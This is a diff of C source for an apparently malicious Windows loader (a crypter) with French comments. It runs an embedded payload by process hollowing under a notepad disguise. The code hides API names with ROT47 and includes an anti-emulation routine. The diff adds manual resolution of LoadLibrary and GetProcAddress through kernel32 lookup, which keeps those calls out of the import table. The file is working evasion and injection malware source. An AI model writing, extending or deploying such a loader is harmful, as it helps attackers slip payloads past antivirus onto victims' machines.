@@ -1,11 +1,11 @@
 #include <windows.h>
 #include "payload.h"
 
-int extern startrand () asm ("_startrand") ; // (unsigned char *);
-int extern findkernel () asm ("_findkernel") ; // (unsigned char *);
+int extern startrand() asm ("_startrand") ; // (unsigned char *);
+int extern findkernel() asm ("_findkernel") ; // (unsigned char *);
+int extern getfunction( int kernel, unsigned char *library, int lenlib ) asm ("_getfunction");
 
-// Redeclaration des fonctions offusquee 
-
+// Redeclaration des type des fonctions offusquee 
 //http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Section/NtUnmapViewOfSection.html
 typedef LONG (WINAPI * PNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
 typedef LONG (WINAPI * PNtResumeThread)(HANDLE ThreadHandle);
@@ -17,6 +17,7 @@ typedef LONG (WINAPI * PGetThreadContext)( HANDLE hthread, LPCONTEXT lpcontext )
 typedef LONG (WINAPI * PGetProcAddress)( HMODULE hModule,LPCSTR lpProcName );
 typedef LONG (WINAPI * PCreateProcessA)(LPCTSTR lpApplicationName,LPCSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCTSTR lpCurrentDirectory,LPSTARTUPINFO lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);
 typedef LONG (WINAPI * PReadProcessMemory)(HANDLE hProcess,LPCVOID lpBaseAddress,LPVOID lpBuffer,SIZE_T nSize,SIZE_T *lpNumberOfBytesRead);
+typedef HINSTANCE (WINAPI * PLoadLibrary ) ( LPCTSTR lpLibFileName ); 
 
 // VM scarving
 int vaauxfraises(int x) {
@@ -62,6 +63,8 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile) {
 	PGetProcAddress xGetProcAddress;
 	PCreateProcessA xCreateProcessA;
 	PReadProcessMemory xReadProcessMemory;
+	PLoadLibrary xLoadLibrary;
+
 	LPVOID pImageBase;
 	int Count;
 
@@ -77,7 +80,7 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile) {
   char vGetProcAddress[]="v6E!C@4p55C6DD";
 	char vCreateProcessA[]="rC62E6!C@46DDp";
 	char vReadProcessMemory[]="#625!C@46DD|6>@CJ";
-
+  char vLoadLibrary[]="{@25{:3C2CJ";
 
  	rot47(vNTDLL);
   rot47(vKERNEL32);
@@ -89,11 +92,14 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile) {
 	rot47(vGetProcAddress);
 	rot47(vCreateProcessA);
 	rot47(vReadProcessMemory);
+	rot47(vLoadLibrary);
 
-	HINSTANCE Hkernel32  = LoadLibrary(vKERNEL32);
-	HINSTANCE Hntdll = LoadLibrary(vNTDLL);
+  xLoadLibrary = (PLoadLibrary) getfunction (findkernel() ,(unsigned char *) vLoadLibrary, strlen(vLoadLibrary) );
 
-	xGetProcAddress = PGetProcAddress(GetProcAddress(Hkernel32,vGetProcAddress));
+	HINSTANCE Hkernel32  = xLoadLibrary(vKERNEL32);
+	HINSTANCE Hntdll = xLoadLibrary(vNTDLL);
+
+	xGetProcAddress = (PGetProcAddress) getfunction(findkernel(),(unsigned char *)vGetProcAddress, strlen(vGetProcAddress));
 	xReadProcessMemory = PReadProcessMemory(xGetProcAddress(Hkernel32,vReadProcessMemory));
   xCreateProcessA = PCreateProcessA(xGetProcAddress(Hkernel32,vCreateProcessA));
 	xNtResumeThread = PNtResumeThread(xGetProcAddress(Hntdll,vNtResumeThread));
@@ -161,8 +167,6 @@ int main()
 {
 
 int dummy = vaauxfraises(41414141);
-// cherche addresse de kernel32... work in progress
-findkernel();
 
 // Ce exe sera notepad
 char fakeexe[]="ri-H:?5@HD-?@E6A25]6I6";
